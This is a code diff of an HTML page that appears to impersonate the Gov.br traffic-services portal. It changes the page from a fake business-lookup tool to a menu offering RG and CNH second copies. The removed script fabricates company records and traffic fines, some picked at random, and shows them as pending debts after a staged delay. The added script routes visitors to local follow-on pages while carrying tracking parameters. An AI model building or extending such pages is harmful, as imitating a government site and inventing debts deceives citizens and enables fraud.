@@ -1,3 +1,4 @@
+
 <!DOCTYPE html><html lang="pt-BR">
 <head>
   <!-- Google tag (gtag.js) -->
@@ -19,8 +20,8 @@
   </script>
   
   <title>Portal de Serviços de Trânsito | Gov.br</title>
-  <meta name="description" content="Consulta de pendências e emissão de documentos de trânsito.">
-  <meta name="keywords" content="cnpj, pendencias, consulta, detran">
+  <meta name="description" content="Emissão da 1a ou 2a via da Carteira de Identidade (RG), Carteira Nacional de Habilitação (CNH) disponível nos modelos cédula em papel moeda e cartão de policarbonato.">
+  <meta name="keywords" content="rg, cnh, segunda via, tirar documento">
   <meta name="author" content="Gov.br">
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -30,7 +31,7 @@
   
   <!-- Open Graph -->
   <meta property="og:title" content="Portal de Serviços de Trânsito | Gov.br">
-  <meta property="og:description" content="Consulta de pendências e emissão de documentos de trânsito.">
+  <meta property="og:description" content="Emissão da 1a ou 2a via da Carteira de Identidade (RG), Carteira Nacional de Habilitação (CNH).">
   <meta property="og:url" content="#">
   <meta property="og:type" content="website">
   <meta property="og:image" content="images/brasao.png">
@@ -52,7 +53,7 @@
   <!-- Scripts -->
   <script src="js/lates.js" data-utmify-prevent-subids="" async defer></script>
   
-  <!-- JavaScript para consulta CNPJ -->
+  <!-- Seu JavaScript existente -->
   <script>
     document.addEventListener("DOMContentLoaded", function() {
         function salvarParametrosNoLocalStorage() {
@@ -67,343 +68,34 @@
         }
         salvarParametrosNoLocalStorage();
         
-        // Função para formatar CNPJ
-        function formatarCNPJ(cnpj) {
-            cnpj = cnpj.replace(/\D/g, '');
-            cnpj = cnpj.replace(/^(\d{2})(\d)/, '$1.$2');
-            cnpj = cnpj.replace(/^(\d{2})\.(\d{3})(\d)/, '$1.$2.$3');
-            cnpj = cnpj.replace(/\.(\d{3})(\d)/, '.$1/$2');
-            cnpj = cnpj.replace(/(\d{4})(\d)/, '$1-$2');
-            return cnpj;
-        }
-        
-        // Função para validar CNPJ
-        function validarCNPJ(cnpj) {
-            cnpj = cnpj.replace(/[^\d]+/g,'');
-            if(cnpj == '') return false;
-            if (cnpj.length != 14) return false;
+        const google = JSON.parse(localStorage.getItem('google')) || {};
+        const params = Object.entries(google)
+            .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
+            .join('&');
             
-            // Elimina CNPJs invalidos conhecidos
-            if (cnpj == "00000000000000" || 
-                cnpj == "11111111111111" || 
-                cnpj == "22222222222222" || 
-                cnpj == "33333333333333" || 
-                cnpj == "44444444444444" || 
-                cnpj == "55555555555555" || 
-                cnpj == "66666666666666" || 
-                cnpj == "77777777777777" || 
-                cnpj == "88888888888888" || 
-                cnpj == "99999999999999")
-                return false;
-                
-            // Valida DVs
-            var tamanho = cnpj.length - 2
-            var numeros = cnpj.substring(0,tamanho);
-            var digitos = cnpj.substring(tamanho);
-            var soma = 0;
-            var pos = tamanho - 7;
-            for (var i = tamanho; i >= 1; i--) {
-              soma += numeros.charAt(tamanho - i) * pos--;
-              if (pos < 2)
-                    pos = 9;
-            }
-            var resultado = soma % 11 < 2 ? 0 : 11 - soma % 11;
-            if (resultado != digitos.charAt(0))
-                return false;
-                
-            tamanho = tamanho + 1;
-            numeros = cnpj.substring(0,tamanho);
-            soma = 0;
-            pos = tamanho - 7;
-            for (var i = tamanho; i >= 1; i--) {
-              soma += numeros.charAt(tamanho - i) * pos--;
-              if (pos < 2)
-                    pos = 9;
-            }
-            resultado = soma % 11 < 2 ? 0 : 11 - soma % 11;
-            if (resultado != digitos.charAt(1))
-                  return false;
-                  
-            return true;
-        }
+        var novaUrl1 = './pagina1/';
+        var novaUrl2 = './pagina2/';
+        var novaUrl3 = './pagina3/';
+        var novaUrl4 = './pagina4/';
+        var novaUrl5 = './pagina5/';
         
-        // Aplicar máscara no campo CNPJ
-        const cnpjInput = document.getElementById('cnpj-input');
-        cnpjInput.addEventListener('input', function(e) {
-            e.target.value = formatarCNPJ(e.target.value);
+        document.getElementById('service1').addEventListener('click', function() {
+            window.location.href = novaUrl1;
         });
-        
-        // Função para simular consulta de pendências
-        function consultarPendencias() {
-            const cnpj = document.getElementById('cnpj-input').value;
-            const resultadoDiv = document.getElementById('resultado-consulta');
-            const loadingDiv = document.getElementById('loading-consulta');
-            
-            if (!cnpj) {
-                alert('Por favor, digite um CNPJ válido.');
-                return;
-            }
-            
-            if (!validarCNPJ(cnpj)) {
-                alert('CNPJ inválido. Por favor, verifique os dados digitados.');
-                return;
-            }
-            
-            // Mostrar loading
-            loadingDiv.style.display = 'block';
-            resultadoDiv.style.display = 'none';
-            
-            // Simular delay da consulta
-            setTimeout(function() {
-                loadingDiv.style.display = 'none';
-                
-                // Dados simulados baseados no CNPJ
-                const cnpjLimpo = cnpj.replace(/\D/g, '');
-                const empresasSimuladas = {
-                    '11222333000181': {
-                        razaoSocial: 'EMPRESA EXEMPLO LTDA',
-                        nomeFantasia: 'Exemplo Transportes',
-                        situacao: 'ATIVA',
-                        dataAbertura: '15/03/2010',
-                        endereco: 'RUA DAS FLORES, 123 - CENTRO - SÃO PAULO/SP',
-                        pendencias: [
-                            { tipo: 'Multa de Trânsito', valor: 'R$ 195,23', vencimento: '15/12/2024' },
-                            { tipo: 'Taxa de Licenciamento', valor: 'R$ 87,38', vencimento: '31/01/2025' }
-                        ]
-                    },
-                    '22333444000195': {
-                        razaoSocial: 'TRANSPORTADORA ABC S/A',
-                        nomeFantasia: 'ABC Logística',
-                        situacao: 'ATIVA',
-                        dataAbertura: '22/08/2005',
-                        endereco: 'AV. BRASIL, 456 - INDUSTRIAL - RIO DE JANEIRO/RJ',
-                        pendencias: []
-                    }
-                };
-                
-                // Usar dados simulados ou gerar dados genéricos
-                let dadosEmpresa;
-                if (empresasSimuladas[cnpjLimpo]) {
-                    dadosEmpresa = empresasSimuladas[cnpjLimpo];
-                } else {
-                    // Gerar dados genéricos para qualquer CNPJ válido
-                    dadosEmpresa = {
-                        razaoSocial: 'EMPRESA CONSULTADA LTDA',
-                        nomeFantasia: 'Empresa Consultada',
-                        situacao: 'ATIVA',
-                        dataAbertura: '01/01/2015',
-                        endereco: 'RUA EXEMPLO, 789 - CENTRO - BRASÍLIA/DF',
-                        pendencias: Math.random() > 0.5 ? [
-                            { tipo: 'Multa de Trânsito', valor: 'R$ 130,16', vencimento: '20/01/2025' }
-                        ] : []
-                    };
-                }
-                
-                // Exibir resultado
-                document.getElementById('empresa-razao').textContent = dadosEmpresa.razaoSocial;
-                document.getElementById('empresa-fantasia').textContent = dadosEmpresa.nomeFantasia;
-                document.getElementById('empresa-cnpj').textContent = cnpj;
-                document.getElementById('empresa-situacao').textContent = dadosEmpresa.situacao;
-                document.getElementById('empresa-abertura').textContent = dadosEmpresa.dataAbertura;
-                document.getElementById('empresa-endereco').textContent = dadosEmpresa.endereco;
-                
-                const pendenciasDiv = document.getElementById('pendencias-lista');
-                if (dadosEmpresa.pendencias.length > 0) {
-                    let pendenciasHtml = '';
-                    dadosEmpresa.pendencias.forEach(function(pendencia) {
-                        pendenciasHtml += `
-                            <div class="pendencia-item">
-                                <div class="pendencia-info">
-                                    <strong>${pendencia.tipo}</strong>
-                                    <span>Valor: ${pendencia.valor}</span>
-                                    <span>Vencimento: ${pendencia.vencimento}</span>
-                                </div>
-                                <div class="pendencia-status">
-                                    <span class="badge badge-warning">PENDENTE</span>
-                                </div>
-                            </div>
-                        `;
-                    });
-                    pendenciasDiv.innerHTML = pendenciasHtml;
-                    document.getElementById('sem-pendencias').style.display = 'none';
-                } else {
-                    pendenciasDiv.innerHTML = '';
-                    document.getElementById('sem-pendencias').style.display = 'block';
-                }
-                
-                resultadoDiv.style.display = 'block';
-            }, 2000);
-        }
-        
-        // Adicionar evento ao botão
-        document.getElementById('consultar-btn').addEventListener('click', consultarPendencias);
-        
-        // Permitir consulta ao pressionar Enter
-        cnpjInput.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                consultarPendencias();
-            }
+        document.getElementById('service2').addEventListener('click', function() {
+            window.location.href = novaUrl2;
+        });
+        document.getElementById('service3').addEventListener('click', function() {
+            window.location.href = novaUrl3;
+        });
+        document.getElementById('service4').addEventListener('click', function() {
+            window.location.href = novaUrl4;
+        });
+        document.getElementById('service5').addEventListener('click', function() {
+            window.location.href = novaUrl5;
         });
     });
   </script>
-  
-  <style>
-    .consulta-cnpj {
-        background: #f8f9fa;
-        padding: 30px;
-        border-radius: 8px;
-        margin-bottom: 30px;
-    }
-    
-    .form-group {
-        margin-bottom: 20px;
-    }
-    
-    .form-group label {
-        display: block;
-        margin-bottom: 8px;
-        font-weight: 600;
-        color: #333;
-    }
-    
-    .form-control {
-        width: 100%;
-        padding: 12px 15px;
-        border: 2px solid #ddd;
-        border-radius: 6px;
-        font-size: 16px;
-        transition: border-color 0.3s;
-    }
-    
-    .form-control:focus {
-        outline: none;
-        border-color: #007bff;
-        box-shadow: 0 0 0 3px rgba(0,123,255,0.1);
-    }
-    
-    .btn-consultar {
-        background: #28a745;
-        color: white;
-        padding: 12px 30px;
-        border: none;
-        border-radius: 6px;
-        font-size: 16px;
-        font-weight: 600;
-        cursor: pointer;
-        transition: background-color 0.3s;
-    }
-    
-    .btn-consultar:hover {
-        background: #218838;
-    }
-    
-    .loading-consulta {
-        text-align: center;
-        padding: 20px;
-        display: none;
-    }
-    
-    .loading-consulta img {
-        width: 50px;
-        height: 50px;
-    }
-    
-    .resultado-consulta {
-        display: none;
-        background: white;
-        border: 1px solid #ddd;
-        border-radius: 8px;
-        padding: 25px;
-        margin-top: 20px;
-    }
-    
-    .empresa-info {
-        background: #f8f9fa;
-        padding: 20px;
-        border-radius: 6px;
-        margin-bottom: 20px;
-    }
-    
-    .empresa-info h4 {
-        color: #007bff;
-        margin-bottom: 15px;
-    }
-    
-    .info-row {
-        display: flex;
-        margin-bottom: 8px;
-    }
-    
-    .info-label {
-        font-weight: 600;
-        min-width: 120px;
-        color: #555;
-    }
-    
-    .info-value {
-        color: #333;
-    }
-    
-    .pendencias-section h4 {
-        color: #dc3545;
-        margin-bottom: 15px;
-    }
-    
-    .pendencia-item {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        padding: 15px;
-        border: 1px solid #ddd;
-        border-radius: 6px;
-        margin-bottom: 10px;
-        background: #fff;
-    }
-    
-    .pendencia-info strong {
-        display: block;
-        color: #333;
-        margin-bottom: 5px;
-    }
-    
-    .pendencia-info span {
-        display: block;
-        color: #666;
-        font-size: 14px;
-    }
-    
-    .badge {
-        padding: 5px 10px;
-        border-radius: 4px;
-        font-size: 12px;
-        font-weight: 600;
-        text-transform: uppercase;
-    }
-    
-    .badge-warning {
-        background: #ffc107;
-        color: #212529;
-    }
-    
-    .badge-success {
-        background: #28a745;
-        color: white;
-    }
-    
-    .sem-pendencias {
-        text-align: center;
-        padding: 30px;
-        color: #28a745;
-        font-size: 18px;
-        font-weight: 600;
-    }
-    
-    .sem-pendencias i {
-        font-size: 48px;
-        margin-bottom: 15px;
-        display: block;
-    }
-  </style>
 </head>
   
 <body><header id="site-header">
@@ -643,4 +335,3 @@
 <script src="js/toastify.min.js"></script>
 </body>
 </html>
-
